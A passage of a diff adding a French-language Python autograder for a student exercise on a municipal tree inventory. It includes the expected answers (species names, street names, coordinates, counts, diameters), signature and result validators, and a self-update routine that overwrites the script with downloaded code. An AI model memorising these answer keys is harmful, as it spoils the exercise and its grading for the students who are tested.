+Alnus spaethii
+Amelanchier
+Amelanchier arborea
+Amelanchier canadensis
+Amelanchier canadensis 'Robin Hill'
+Amelanchier canadensis 'lamarckii'
+Amelanchier grandiflora 'Autumn Brilliance'
+Amelanchier grandiflora 'Princess Diana'
+Amelanchier laevis
+Amelanchier laevis 'Ballerina'
+Amelanchier laevis 'Cumulus'
+Amelanchier laevis Spring Flurry
+Arbre feuillu privé en haie
+Betula
+Betula alleghaniensis
+Betula glandulosa
+Betula nigra
+Betula nigra 'Heritage'
+Betula papyrifera
+Betula papyrifera 'Oenci'
+Betula papyrifera 'Prairie Dream'
+Betula papyrifera 'Reflection Renaissance'
+Betula pendula
+Betula pendula 'Laciniata'
+Betula pendula 'Purpurea'
+Betula platiphylla Dakota Pinnacle
+Betula platyphylla 'Japonica'
+Betula populifolia
+Betula pumila
+Carpinus caroliana
+Carpinus caroliana Rising Fire
+Carya cordiformis
+Carya laciniosa
+Carya ovata
+Catalpa
+Catalpa ovata
+Catalpa speciosa
+Celtis occidentalis
+Celtis occidentalis ' Ultra'
+Celtis occidentalis 'Chiacagoland'
+Celtis occidentalis 'Prairie Sentinel'
+Cercidiphyllum japonicum
+Cercis canadensis
+Chamaecyparis pisifera
+Cladrastris lutea
+Conifère privé en haie
+Cornus alternifolia
+Corylus colurna
+Crataegus
+Crataegus crus-galli 'Inermis'
+Crataegus crus-galli inermis 'Cruzam'
+Crataegus leavigata 'Crimson Cloud'
+Crataegus mordenensis 'Snowbird'
+Crataegus mordenensis 'Toba'
+Crataegus punctata
+Crataegus virilis 'Winter King'
+Elaeagnus angustifolia
+Essence à déterminer
+Eucommia ulmoïdes
+Fagus
+Fagus grandifolia
+Fagus sylvatica 'Red Obelisk'
+Fagus sylvatica purpurea
+Fraxinus
+Fraxinus americana
+Fraxinus americana 'Autumn Applause'
+Fraxinus americana 'Autumn Blaze'
+Fraxinus americana 'Autumn Purple'
+Fraxinus americana 'Manitou'
+Fraxinus americana 'Northern Treasure'
+Fraxinus americana 'Windy City'
+Fraxinus excelsior
+Fraxinus excelsior 'Pendula'
+Fraxinus mandshurica
+Fraxinus nigra
+Fraxinus nigra 'Fall Gold'
+Fraxinus pennsylvanica
+Fraxinus pennsylvanica 'Bergeson'
+Fraxinus pennsylvanica 'Lanceolata'
+Fraxinus pennsylvanica 'Marshall Seedless'
+Fraxinus pennsylvanica 'Patmore'
+Fraxinus pennsylvanica 'Prairie Spire'
+Fraxinus pennsylvanica 'Summit'
+Fraxinus quadrangulata
+Ginkgo biloba
+Ginkgo biloba 'Magyar'
+Ginkgo biloba 'Princeton Sentry'
+Ginkgo biloba Autumn Gold
+Ginkgo biloba Fairmount
+Ginkgo biloba The President
+Gleditsia
+Gleditsia triacanthos inermis
+Gleditsia triacanthos inermis 'Dursan'
+Gleditsia triacanthos inermis 'Halka'
+Gleditsia triacanthos inermis 'Imperial'
+Gleditsia triacanthos inermis 'Northern Acclaim'
+Gleditsia triacanthos inermis 'Perfection'
+Gleditsia triacanthos inermis 'Shademaster'
+Gleditsia triacanthos inermis 'Skyline'
+Gleditsia triacanthos inermis 'Spectrum'
+Gleditsia triacanthos inermis 'Street Keeper'
+Gleditsia triacanthos inermis 'Sunburst'
+Gymnocladus dioicus
+Gymnocladus dioicus 'Espresso'
+Juglans
+Juglans cinerea
+Juglans nigra
+Larix
+Larix Kaempferi
+Larix decidua
+Larix decidua 'Pendula'
+Larix laricina
+Larix x marschlinsii
+Liquidambar styraciflua 'Moraine'
+Liriodendron tulipifera
+Maackia amurensis
+Magnolia
+Magnolia acuminata
+Magnolia loebneri Leonard Messel
+Malus
+Malus 'Almey'
+Malus 'American Beauty'
+Malus 'Autumn Delight '
+Malus 'Autumn Gold'
+Malus 'Brandywine'
+Malus 'Centurion'
+Malus 'Coralburst'
+Malus 'Coutabri'
+Malus 'Cowichan'
+Malus 'Dolgo'
+Malus 'Echtermeyer'
+Malus 'Evereste'
+Malus 'Gladiator'
+Malus 'Golden Raindrops'
+Malus 'Harvest Gold'
+Malus 'Hopa'
+Malus 'Indian Magic'
+Malus 'Indian Summer'
+Malus 'John Downie'
+Malus 'Kerr'
+Malus 'Liberty'
+Malus 'Louisa'
+Malus 'Madonna'
+Malus 'Makamik'
+Malus 'Maybride'
+Malus 'Ming Dynasty'
+Malus 'Molten Lava'
+Malus 'Naragansett'
+Malus 'Ormiston Roy'
+Malus 'Pink River'
+Malus 'Pink Spires'
+Malus 'Prairie Fire'
+Malus 'Radiant'
+Malus 'Ralph Shay'
+Malus 'Red Jade'
+Malus 'Red Jewel'
+Malus 'Red Splendor'
+Malus 'Rinki'
+Malus 'Robinson'
+Malus 'Rosseau'
+Malus 'Royal Beauty'
+Malus 'Royal Raindrops'
+Malus 'Royalty'
+Malus 'Rudolph'
+Malus 'Scarlett'
+Malus 'Selkirck'
+Malus 'Shaker Gold'
+Malus 'Snowcloud'
+Malus 'Snowdrif '
+Malus 'Springsnow'
+Malus 'Sugar Tyme'
+Malus 'Sweet Sixteen'
+Malus 'Thunderchild'
+Malus 'Tschonoskii'
+Malus 'Winter Gold'
+Malus baccata
+Malus baccata ' Rosthern '
+Malus baccata 'Columnaris'
+Malus baccata 'Erecta'
+Malus floribunda 'Rosea'
+Malus ioensis 'Klehmi'
+Malus moerlandsii 'Liset'
+Malus moerlandsii 'Profusion'
+Malus purpurea
+Malus purpurea 'Eleyi Compacta'
+Malus sargentii
+Malus zumi 'Calocarpa'
+Metasequoia glyptostroboides
+Morus alba
+Morus alba 'Pendula'
+Orme privé en haie
+Ostrya virginiana
+Phellodendron Eye Stopper
+Phellodendron amurense
+Phellodendron amurense 'His Majesty'
+Phellodendron amurense 'Macho'
+Picea
+Picea abies
+Picea abies 'Acrocona'
+Picea abies 'Penddula'
+Picea abies 'Rubra Spicata'
+Picea abies 'Viminalis'
+Picea abies 'Virgata '
+Picea asperata 'Pendula'
+Picea glauca
+Picea glauca 'Coerulea'
+Picea glauca 'Pendula'
+Picea mariana
+Picea omorika
+Picea omorika 'Pendua'
+Picea pugens 'Bakerii'
+Picea pungens
+Picea pungens 'Baby Blue Eyes'
+Picea pungens 'Fat Albert'
+Picea pungens 'Glauca Bleu Intense'
+Picea pungens 'Glauca Fastigiata'
+Picea pungens 'Glauca'
+Picea pungens 'Hoopsii'
+Picea pungens 'Iseli Fastigiata'
+Picea pungens 'Koster'
+Picea pungens 'Mission Blue'
+Picea pungens 'Moerheim'
+Picea pungens 'Montgomery'
+Picea pungens 'Pendula'
+Picea pungens 'Shilo Weeping'
+Picea pungens 'Tiffin'
+Pinus
+Pinus aristata
+Pinus banksiana
+Pinus cembra
+Pinus mugo
+Pinus mugo 'Mughus'
+Pinus nigra
+Pinus nigra 'Arnold Sentinel'
+Pinus parviflora
+Pinus ponderosa
+Pinus resinosa
+Pinus strobus
+Pinus strobus 'Alba'
+Pinus sylvestris
+Platanus acerifolia 'Exclamation'
+Platanus occidentalis
+Populus
+Populus X berolinensis
+Populus alba
+Populus balsamifera
+Populus canadensis 'Eugeni'
+Populus canadensis 'Prairie Sky'
+Populus canescens 'Tower'
+Populus deltoides
+Populus deltoides 'Siouxland'
+Populus grandidentata
+Populus nigra 'Italica'
+Populus tremula 'Erecta'
+Populus tremuloides
+Populus tremuloides 'Prairie Gold '
+Populus x canescens
+Prunus
+Prunus 'Pembina'
+Prunus cistena
+Prunus maackii
+Prunus maackii 'Ming'
+Prunus maackii Goldspur
+Prunus maackii Klondike
+Prunus padus
+Prunus padus 'Colorata'
+Prunus padus 'Commutata'
+Prunus pensylvanica
+Prunus serotina
+Prunus toka
+Prunus virginiana
+Prunus virginiana 'Schubert'
+Pseudotsuga Menziesii
+Pseudotsuga menziesii glauca
+Ptelea trifoliata
+Pyrus
+Pyrus 'Bartlett'
+Pyrus calleryana 'Chanticleer'
+Pyrus communis 'Beauté Flamande'
+Pyrus communis 'Clapp's Favorite '
+Pyrus fauriei 'Westwood'
+Pyrus ussuriensis
+Pyrus ussuriensis Mordak
+Pyrus ussuriensis Mountain frost
+Quercus
+Quercus 'Regal Prince'
+Quercus Jordan Street
+Quercus Streetspire
+Quercus alba
+Quercus biicolor
+Quercus coccinea
+Quercus ellipsoidalis
+Quercus ellipsoidalis 'Majestic Skies'
+Quercus macrocarpa
+Quercus macrocarpa 'Urban Pinnacle'
+Quercus muehlenbergii
+Quercus palustris
+Quercus palustris 'GreenPillar'
+Quercus palustris 'Pacific Brilliance'
+Quercus petraea
+Quercus robur
+Quercus robur 'Crimson Spire'
+Quercus robur 'Fastigiata Skyrocket'
+Quercus robur 'Fatigiata'
+Quercus robur 'Kindred Spirit'
+Quercus rubra
+Rhus typhina
+Robinia pseudoacacia
+Robinia pseudoacacia 'Purple Robe'
+Salix
+Salix alba
+Salix alba 'Tristis'
+Salix babylonica
+Salix babylonica 'Prairie Cascade'
+Salix fragilis
+Salix pentandra
+Sorbus
+Sorbus americana
+Sorbus americana 'Belmonte'
+Sorbus aucuparia
+Sorbus aucuparia 'Cardinal Royal'
+Sorbus aucuparia 'Fastigiata'
+Sorbus aucuparia 'Rossica'
+Sorbus decora
+Sorbus intermedia
+Sorbus thuringiaca 'Fastigiata'
+Syringa pekinensis 'SunDak'
+Syringa reticulata
+Syringa reticulata 'Boulevard'
+Syringa reticulata 'Golden Eclipse'
+Syringa reticulata 'Ivory Silk'
+Syringa vulgaris
+Thuja
+Thuja occidentalis
+Thuja occidentalis 'Fastigiata'
+Thuja occidentalis 'Smaragd '
+Tilia
+Tilia 'Flavescens Glenleven'
+Tilia 'Flavescens Sheridan hybrids'
+Tilia americana
+Tilia americana 'American Sentry'
+Tilia americana 'Boulevard'
+Tilia americana 'Nova'
+Tilia americana 'Redmond'
+Tilia americana 'fastigiata'
+Tilia cordata
+Tilia cordata 'Corzam'
+Tilia cordata 'De Groot'
+Tilia cordata 'Golden Cascade'
+Tilia cordata 'Greenspire'
+Tilia cordata 'Norlin'
+Tilia dasystyla
+Tilia europaea 'Pallida'
+Tilia europaea 'Wratislaviensis'
+Tilia mongolica 'Harvest Gold'
+Tilia platyphyllos
+Tilia tomentosa 'Shahazam'
+Tilia tomentosa 'Sterling'
+Tsuga canadensis
+Ulmus
+Ulmus 'Danada Charm'
+Ulmus 'Frontier'
+Ulmus 'Homestead'
+Ulmus 'Morten Commendation'
+Ulmus 'Morton Accolade'
+Ulmus 'Morton Glossy Triumph'
+Ulmus 'New Horizon'
+Ulmus 'Regal'
+Ulmus americana
+Ulmus americana 'Brandon'
+Ulmus americana 'Delaware'
+Ulmus americana 'Jefferson'
+Ulmus americana 'New Harmony'
+Ulmus americana 'Princeton'
+Ulmus americana 'Valley Forge'
+Ulmus davidiana 'Discovery'
+Ulmus davidiana 'Greenstone'
+Ulmus davidiana Burgundy Glow
+Ulmus glabra
+Ulmus glabra 'Camperdownii'
+Ulmus glabra 'Exoniensis'
+Ulmus hollandica 'Pioneer'
+Ulmus parvifolia 'Geisha'
+Ulmus patriot
+Ulmus pumila
+Ulmus pumila 'Park Royal'
+Ulmus rubra
+Ulmus thomasii
+Ulmus wilsoniana 'Prospector'
+Ulmus x
+Viburnum lentago
+syringa reticulata ssp amurensis
+thuya occidentalis 'Nigra'""".splitlines(),
+        "type_attendu"    : list,
+        "ordre_important" : False,
+    },
+    "question2": {
+        "question"     : "Quelle est la topographie où se trouve l'arbre le plus au point cardinal demandé?",
+        "type_attendu" : str,
+        "cas"          : [
+            ("sud", "Rue Moisan"),
+            ("nord", "Rue des Hautes-Terres"),
+            ("est", "Piste cyclable Corridor du Littoral"),
+            ("ouest", "Chemin du Roy"),
+        ],
+    },
+    "question3": {
+        "question"     : "Quelques infos sur l'arbre le plus au point cardinal demandé?",
+        "type_attendu" : dict,
+        "cas"          : [
+            ("sud", {
+                "espece_en_français": "orme d'Amérique",
+                "coordonnées": (46.7236561843032, -71.48769442648174),
+                "nom": "Rue Moisan",
+            }),
+            ("nord", {
+                "espece_en_français": "aubépine ergot-de-coq 'Inermis'",
+                "coordonnées": (46.95887005661445, -71.21440621073573),
+                "nom": "Rue des Hautes-Terres",
+            }),
+            ("est", {
+                "espece_en_français": "peuplier à feuilles deltoides",
+                "coordonnées": (46.88353165685608, -71.14657868701667),
+                "nom": "Piste cyclable Corridor du Littoral",
+            }),
+            ("ouest", {
+                "espece_en_français": "orme d'Amérique",
+                "coordonnées": (46.7252505146418, -71.53657773485358),
+                "nom": "Chemin du Roy",
+            }),
+        ],
+    },
+    "question4": {
+        "question"     : "Combien d'espèces distinctes sont recensées dans le lieu demandé?",
+        "valeur"       : 44,
+        "type_attendu" : int,
+        "cas"          : [
+            ("Parc Jean-Marc-Gauthier", 26),
+            ("Parc De Beaumont", 32),
+            ("Parc Bardy", 44),
+            ("Parc-école de Stadacona", 6)
+        ],
+    },
+    "question5": {
+        "question"     : "Quel lieu compte le plus d'espèces d'arbres?",
+        "valeur"       : {
+            "nom_lieu": "Parc de l'Arboretum",
+            "nombre_espèces": 204,
+        },
+        "type_attendu" : dict,
+    },
+    "question6": {
+        "question"     : "Quel est le diamètre moyen du tronc des feuillus et des conifères dans le lieu demandé?",
+        "type_attendu" : dict,
+        "tolerance"    : 0.01,
+        "cas"          : [
+            ("Parc Bardy", {
+                "diametre_feuillus": 27.2347,
+                "diametre_coniferes": 23.375,
+            }),
+            ("Parc De Beaumont", {
+                "diametre_feuillus": 36.8804,
+                "diametre_coniferes": 32.3404,
+            }),
+        ],
+    },
+}
+
+
+# ════════════════════════════════════════════════════════════════════════════════
+# 🖨️  FONCTIONS D'AFFICHAGE
+# ════════════════════════════════════════════════════════════════════════════════
+
+def print_vert(texte):   print(f"\033[32m{texte}\033[0m")
+def print_rouge(texte):  print(f"\033[31m{texte}\033[0m")
+def print_jaune(texte):  print(f"\033[93m{texte}\033[0m")
+def print_cyan(texte):   print(f"\033[96m{texte}\033[0m")
+
+
+def banniere(titre):
+    ligne = "*+*" * 26 + "*"
+    print(ligne)
+    print(f"  {titre}")
+    print(ligne)
+
+
+# ════════════════════════════════════════════════════════════════════════════════
+# 🔄  ÉTAPE #0 — MISE À JOUR AUTOMATIQUE
+# ════════════════════════════════════════════════════════════════════════════════
+
+def relancer_telechargement_csv():
+    """
+    Exécute telecharger_arbres_csv.py (situé dans le même dossier que ce script)
+    pour récupérer la version du fichier CSV qui correspond au nouvel autocorrecteur.
+    """
+    dossier = os.path.dirname(os.path.abspath(__file__))
+    chemin  = os.path.join(dossier, SCRIPT_TELECHARGEMENT_CSV)
+
+    if not os.path.isfile(chemin):
+        print_jaune(f"⚠️  {SCRIPT_TELECHARGEMENT_CSV} est introuvable dans {dossier}.")
+        print_jaune("    Exécutez-le manuellement pour mettre à jour le fichier CSV.")
+        return
+
+    print_jaune(f"    Exécution de {SCRIPT_TELECHARGEMENT_CSV} pour mettre à jour le fichier CSV...")
+    print()
+    try:
+        resultat = subprocess.run([sys.executable, chemin], cwd=dossier)
+    except Exception as e:
+        print_rouge(f"❌ Impossible d'exécuter {SCRIPT_TELECHARGEMENT_CSV} : {e}")
+        return
+
+    print()
+    if resultat.returncode == 0:
+        print_vert("✅ Le fichier CSV a été mis à jour.")
+    else:
+        print_rouge(f"❌ {SCRIPT_TELECHARGEMENT_CSV} s'est terminé avec une erreur (code {resultat.returncode}).")
+        print_rouge("   Exécutez-le manuellement pour mettre à jour le fichier CSV.")
+
+
+def etape_0_mise_a_jour():
+    banniere(f"🔄 ÉTAPE 0 de 2 — Vérification de la version du script ({VERSION})")
+    print()
+
+    if not REQUESTS_DISPONIBLE:
+        print_jaune("⚠️  Le module 'requests' n'est pas installé.")
+        print_jaune("   Vérification des mises à jour impossible.")
+        print_jaune("   Installez-le avec : pip install requests")
+        print()
+        exit()
+        return
+
+    if "REMPLACER" in URL_MISE_A_JOUR:
+        print_jaune("⚠️  L'URL de mise à jour n'est pas configurée. Étape ignorée.")
+        print()
+        return
+
+    try:
+        reponse = requests.get(URL_MISE_A_JOUR, timeout=1000)
+
+        if reponse.status_code != 200:
+            print_jaune(f"⚠️  Impossible d'accéder à l'URL (code HTTP {reponse.status_code}).")
+            print()
+            return
+
+        contenu_distant = reponse.text
+        version_distante = None
+
+        for ligne in contenu_distant.splitlines():
+            if ligne.strip().startswith("VERSION"):
+                try:
+                    version_distante = ligne.split("=")[1].strip().strip('"').strip("'")
+                except Exception:
+                    pass
+                break
+
+        if version_distante is None:
+            print_jaune("⚠️  Impossible de lire la version distante.")
+
+        elif tuple(map(int, version_distante.split("."))) > tuple(map(int, VERSION.split("."))):
+            print_jaune(f"⚠️  Nouvelle version disponible : {version_distante}  (version actuelle : {VERSION})")
+            print_jaune("    Mise à jour automatique en cours...")
+            with open(os.path.abspath(__file__), "w", encoding="utf-8") as f:
+                f.write(contenu_distant)
+            print_vert("✅ Mise à jour de l'autocorrecteur réussie!")
+            relancer_telechargement_csv()
+            print_vert("👉 Veuillez relancer l'autocorrecteur.")
+            sys.exit(0)
+
+        else:
+            print_vert(f"✅ Le script est à jour (version {VERSION}).")
+
+    except requests.exceptions.ConnectionError:
+        print_jaune("⚠️  Pas de connexion Internet — vérification des mises à jour ignorée.")
+    except Exception as e:
+        print_jaune(f"⚠️  Erreur lors de la vérification des mises à jour : {e}")
+
+    print()
+
+
+# ════════════════════════════════════════════════════════════════════════════════
+# ✅  ÉTAPE #1 — VALIDATION DES SIGNATURES
+# ════════════════════════════════════════════════════════════════════════════════
+
+def formater_signature(nom):
+    """Retourne la signature attendue d'une fonction, ex. question6(lieu="Parc Bardy")."""
+    morceaux = []
+    for nom_param, defaut in SIGNATURES_ATTENDUES[nom]:
+        if defaut is OBLIGATOIRE:
+            morceaux.append(nom_param)
+        else:
+            morceaux.append(f"{nom_param}={defaut!r}".replace("'", '"'))
+    return f"{nom}({', '.join(morceaux)})"
+
+
+def signature_est_conforme(func, parametres_attendus):
+    """Vérifie que les paramètres de func correspondent exactement à ceux attendus."""
+    params = list(inspect.signature(func).parameters.values())
+    if len(params) != len(parametres_attendus):
+        return False
+    for param, (nom_attendu, defaut_attendu) in zip(params, parametres_attendus):
+        if param.name != nom_attendu:
+            return False
+        if param.kind not in (
+            inspect.Parameter.POSITIONAL_ONLY,
+            inspect.Parameter.POSITIONAL_OR_KEYWORD,
+        ):
+            return False
+        if defaut_attendu is OBLIGATOIRE:
+            if param.default is not inspect.Parameter.empty:
+                return False
+        elif param.default is inspect.Parameter.empty or param.default != defaut_attendu:
+            return False
+    return True
+
+
+def cellule_statut(statut, largeur):
+    """Cellule centrée et colorée : True (vert), False (rouge) ou Absente (jaune)."""
+    if statut is None:
+        texte, code = "Absente", "\033[93m"
+    else:
+        texte = "True" if statut else "False"
+        code  = "\033[32m" if statut else "\033[31m"
+    pad   = largeur - len(texte)
+    pad_g = pad // 2
+    pad_d = pad - pad_g
+    return f"{' ' * pad_g}{code}{texte}\033[0m{' ' * pad_d}"
+
+
+def etape_1_validation_parametres():
+    banniere("🤖 ÉTAPE 1 de 2 — Validation des signatures")
+    print()
+
+    infos = []
+    for nom, parametres in SIGNATURES_ATTENDUES.items():
+        func = getattr(analyse, nom, None)
+        if not inspect.isfunction(func):
+            statut = None  # fonction absente
+        else:
+            statut = signature_est_conforme(func, parametres)
+        infos.append({
+            "nom"       : nom,
+            "signature" : formater_signature(nom),
+            "statut"    : statut,
+        })
+
+    if all(i["statut"] is None for i in infos):
+        print_rouge("❌ Aucune des fonctions attendues (question1 à question6) n'a été trouvée dans analyse.py!")
+        sys.exit(1)
+
+    col_nom = max(len("Fonction"), max(len(i["nom"]) for i in infos)) + 2
+    col_sig = max(len("Signature attendue"), max(len(i["signature"]) for i in infos)) + 2
+    col_ok  = len("Signature conforme") + 2
+
+    sep = f"  +{'-' * col_nom}+{'-' * col_sig}+{'-' * col_ok}+"
+
+    print(sep)
+    print(
+        f"  |{'Fonction':^{col_nom}}|{'Signature attendue':^{col_sig}}|"
+        f"{'Signature conforme':^{col_ok}}|"
+    )
+    print(sep)
+
+    erreur = False
+    for i in infos:
+        nom_cell = f"{i['nom']:^{col_nom}}"
+        sig_cell = f"{i['signature']:^{col_sig}}"
+        ok_cell  = cellule_statut(i["statut"], col_ok)
+        print(f"  |{nom_cell}|{sig_cell}|{ok_cell}|")
+        if i["statut"] is False:
+            erreur = True
+
+    print(sep)
+    print()
+
+    if erreur:
+        print_rouge("❌ ERREUR : Une ou plusieurs fonctions n'ont pas la signature attendue.")
+        print_rouge("   question2 et question3 doivent prendre uniquement le paramètre obligatoire cardinal.")
+        print_rouge("   question4 doit prendre uniquement le paramètre obligatoire nom_lieu.")
+        print_rouge('   question6 doit prendre le paramètre optionnel lieu="Parc Bardy".')
+        print_rouge("   question1 et question5 ne doivent prendre aucun paramètre.")
+        print_rouge("   ⛔ L'étape #2 ne sera pas exécutée.")
+        sys.exit(1)
+
+    absentes = [i["nom"] for i in infos if i["statut"] is None]
+    if absentes:
+        print_jaune("⚠️  Fonction(s) absente(s) de analyse.py : " + ", ".join(absentes))
+        print_vert("✅ Les fonctions présentes ont la signature attendue.")
+    else:
+        print_vert("✅ Toutes les fonctions ont la signature attendue.")
+    print()
+
+
+# ════════════════════════════════════════════════════════════════════════════════
+# 🔍  ÉTAPE #2 — VALIDATION DES QUESTIONS D'ANALYSE
+# ════════════════════════════════════════════════════════════════════════════════
+
+def trouver_fonctions_analyse():
+    """
+    Retourne un dict {nom_fonction: fonction} contenant les fonctions attendues
+    (question1 à question6) qui sont définies dans le module analyse.
+    """
+    resultat = {}
+    for nom in FONCTIONS_ATTENDUES:
+        func = getattr(analyse, nom, None)
+        if inspect.isfunction(func):
+            resultat[nom] = func
+    return resultat
+
+
+# ── Fonctions de validation par type ────────────────────────────────────────
+
+def valider_liste(obtenu, attendu, ordre_important):
+    """Valide une liste et fournit des indices précis sur les erreurs."""
+    ensemble_obtenu  = set(obtenu)
+    ensemble_attendu = set(attendu)
+
+    # Cas succès
+    if list(obtenu) == attendu:
+        print_vert("   ✅ Résultat correct!")
+        return True
+
+    if not ordre_important and ensemble_obtenu == ensemble_attendu:
+        print_vert("   ✅ Résultat correct! (l'ordre n'est pas important)")
+        return True
+
+    # Cas d'erreur avec indices
+    if len(obtenu) > len(attendu):
+        print_rouge(f"   ❌ Trop d'éléments dans la liste ({len(obtenu)} obtenus, {len(attendu)} attendus).")
+        en_trop = ensemble_obtenu - ensemble_attendu
+        if en_trop:
+            print_rouge(f"      Éléments en trop : {sorted(en_trop)}")
+
+    elif len(obtenu) < len(attendu):
+        print_rouge(f"   ❌ Il manque des éléments dans la liste ({len(obtenu)} obtenus, {len(attendu)} attendus).")
+        manquants = ensemble_attendu - ensemble_obtenu
+        if manquants:
+            print_rouge(f"      Éléments manquants : {sorted(manquants)}")
+
+    else:
+        # Même longueur
+        if ensemble_obtenu != ensemble_attendu:
+            print_rouge("   ❌ La liste ne contient pas les bons éléments.")
+            manquants = ensemble_attendu - ensemble_obtenu
+            en_trop   = ensemble_obtenu - ensemble_attendu
+            if manquants:
+                print_rouge(f"      Éléments manquants : {sorted(manquants)}")
+            if en_trop:
+                print_rouge(f"      Éléments en trop   : {sorted(en_trop)}")
+        elif ordre_important:
+            print_rouge("   ❌ Les éléments sont bons, mais pas dans le bon ordre.")
+            print_rouge(f"      Attendu : {attendu}")
+            print_rouge(f"      Obtenu  : {obtenu}")
+
+    return False
+
+
+def valider_dict(obtenu, attendu, tolerance):
+    """Valide un dictionnaire clé par clé, avec tolérance sur les flottants."""
+    correct = True
+
+    cles_manquantes = set(attendu.keys()) - set(obtenu.keys())
+    cles_en_trop    = set(obtenu.keys())  - set(attendu.keys())
+
+    if cles_manquantes:
+        print_rouge(f"   ❌ Clé(s) manquante(s) dans le dictionnaire : {cles_manquantes}")
+        correct = False
+
+    if cles_en_trop:
+        print_rouge(f"   ❌ Clé(s) inattendue(s) dans le dictionnaire : {cles_en_trop}")
+        correct = False
+
+    for cle in set(attendu.keys()) & set(obtenu.keys()):
+        val_att = attendu[cle]
+        val_obt = obtenu[cle]
+
+        if isinstance(val_att, tuple):
+            tol = tolerance if tolerance > 0 else 1e-9
+            if not isinstance(val_obt, tuple):
+                print_rouge(f"   ❌ '{cle}' : doit être un tuple.")
+                print_rouge(f"      Type obtenu : {type(val_obt).__name__}")
+                correct = False
+            elif len(val_obt) != len(val_att):
+                print_rouge(f"   ❌ '{cle}' : le tuple doit contenir {len(val_att)} éléments (obtenu : {len(val_obt)}).")
+                correct = False
+            else:
+                try:
+                    egaux = all(math.isclose(float(o), a, abs_tol=tol) for o, a in zip(val_obt, val_att))
+                except (TypeError, ValueError):
+                    egaux = False
+                if not egaux:
+                    if tuple(val_obt[::-1]) == val_att or (
+                        all(isinstance(v, (int, float)) for v in val_obt)
+                        and all(math.isclose(float(o), a, abs_tol=tol) for o, a in zip(val_obt[::-1], val_att))
+                    ):
+                        print_rouge(f"   ❌ '{cle}' : les valeurs sont inversées. L'ordre attendu est (latitude, longitude).")
+                    else:
+                        print_rouge(f"   ❌ '{cle}' : valeur incorrecte.")
+                    print_rouge(f"      Attendu : {val_att}   Obtenu : {val_obt}")
+                    correct = False
+
+        elif isinstance(val_att, float):
+            tol = tolerance if tolerance > 0 else 1e-9
+            if not math.isclose(float(val_obt), val_att, abs_tol=tol):
+                direction = "trop élevée" if val_obt > val_att else "trop basse"
+                print_rouge(f"   ❌ '{cle}' : valeur {direction}.")
+                print_rouge(f"      Attendu : {val_att:.4f}   Obtenu : {val_obt:.4f}")
+                correct = False
+
+        elif isinstance(val_att, int):
+            if val_obt != val_att:
+                direction = "trop élevée" if val_obt > val_att else "trop basse"
+                print_rouge(f"   ❌ '{cle}' : valeur {direction}.")
+                print_rouge(f"      Attendu : {val_att}   Obtenu : {val_obt}")
+                correct = False
+
+        else:
+            if val_obt != val_att:
+                print_rouge(f"   ❌ '{cle}' : valeur incorrecte.")
+                print_rouge(f"      Attendu : '{val_att}'   Obtenu : '{val_obt}'")
+                correct = False
+
+    if correct:
+        print_vert("   ✅ Résultat correct!")
+
+    return correct
+
+
+def type_est_valide(obtenu, type_attendu):
+    """
+    Vérifie que la valeur retournée est du type attendu.
+    Les types numériques de NumPy (ex. numpy.int64) et les StringArray de pandas
+    sont acceptés comme équivalents des types Python correspondants.
+    """
+    if isinstance(obtenu, bool):
+        return type_attendu == bool
+    if type_attendu == list:
+        return isinstance(obtenu, (list, pd.arrays.StringArray))
+    if type_attendu == int:
+        return isinstance(obtenu, (int, np.integer))
+    if type_attendu == float:
+        return isinstance(obtenu, (int, float, np.integer, np.floating))
+    return isinstance(obtenu, type_attendu)
+
+
+def valider_resultat(nom_fonction, obtenu, valeur_attendue=None):
+    """
+    Dispatche la validation selon le type attendu pour une fonction donnée.
+    Retourne True si la réponse est correcte, False sinon.
+    """
+    config        = RESULTATS_ATTENDUS[nom_fonction]
+    attendu       = config["valeur"] if valeur_attendue is None else valeur_attendue
+    type_attendu  = config["type_attendu"]
+
+    # ── Vérification du type de retour ──────────────────────────────────────
+    if not type_est_valide(obtenu, type_attendu):
+        print_rouge(f"   ❌ Mauvais type de retour!")
+        print_rouge(f"      Type attendu : {type_attendu.__name__}")
+        print_rouge(f"      Type obtenu  : {type(obtenu).__name__}")
+        return False
+
+    # ── Validation selon le type ─────────────────────────────────────────────
+    if type_attendu == str:
+        if obtenu == attendu:
+            print_vert("   ✅ Résultat correct!")
+            return True
+        else:
+            print_rouge(f"   ❌ Résultat incorrect.")
+            print_rouge(f"      Attendu : '{attendu}'")
+            print_rouge(f"      Obtenu  : '{obtenu}'")
+            return False
+
+    elif type_attendu in (int, float):
+        tol = config.get("tolerance", 0)
+        if math.isclose(float(obtenu), float(attendu), abs_tol=tol):
+            print_vert("   ✅ Résultat correct!")
+            return True
+        else:
+            direction = "trop élevée" if obtenu > attendu else "trop basse"
+            print_rouge(f"   ❌ Valeur {direction}.")
+            print_rouge(f"      Attendu : {attendu}   Obtenu : {obtenu}")
+            return False
+
+    elif type_attendu == list or type_attendu == pd.arrays.StringArray:
+        return valider_liste(obtenu, attendu, config.get("ordre_important", True))
+
+    elif type_attendu == dict:
+        return valider_dict(obtenu, attendu, config.get("tolerance", 0.0))
+
+    # Type non géré
+    print_jaune(f"   ⚠️  Type '{type_attendu.__name__}' non pris en charge par le validateur.")
+    return False
+
+
+def etape_2_validation_questions():
+    banniere("🤖 ÉTAPE 2 de 2 — Validation des questions d'analyse (question1 à question6)")
+    print()
+
+    fonctions = trouver_fonctions_analyse()
+
+    if not fonctions:
+        print_jaune("⚠️  Aucune fonction d'analyse (question1 à question6) trouvée dans analyse.py.")
+        print_jaune("   Assurez-vous que les fonctions portent exactement ces noms.")
+        sys.exit(0)
+
+    nb_trouvees = len(fonctions)
+    print(f"  {nb_trouvees} fonction(s) d'analyse trouvée(s) sur {NB_QUESTIONS} attendues.\n")
+
+    resultats = {}
+
+    for nom in FONCTIONS_ATTENDUES:
+
+        if nom not in fonctions:
+            print_jaune(f"  [{nom}] ⚠️  Fonction non trouvée — ignorée.")
+            print()
+            continue
+
+        func     = fonctions[nom]
+        question = RESULTATS_ATTENDUS[nom].get("question", nom)
+
+        print(f"  [{formater_signature(nom)}]")
+        print(f"         {question}")
+
+        if "cas" in RESULTATS_ATTENDUS[nom]:
+            resultats_cas = []
+            for argument, valeur_attendue in RESULTATS_ATTENDUS[nom]["cas"]:
+                print(f"   Cas : {argument}")
+                try:
+                    obtenu = func(argument)
+                    resultats_cas.append(
+                        valider_resultat(nom, obtenu, valeur_attendue)
+                    )
+                except Exception as e:
+                    print_rouge(f"   ❌ Erreur avec l'argument {argument} :")
+                    print_rouge(f"      {e}")
+                    resultats_cas.append(False)
+            resultats[nom] = all(resultats_cas)
+        else:
+            try:
+                obtenu = func()
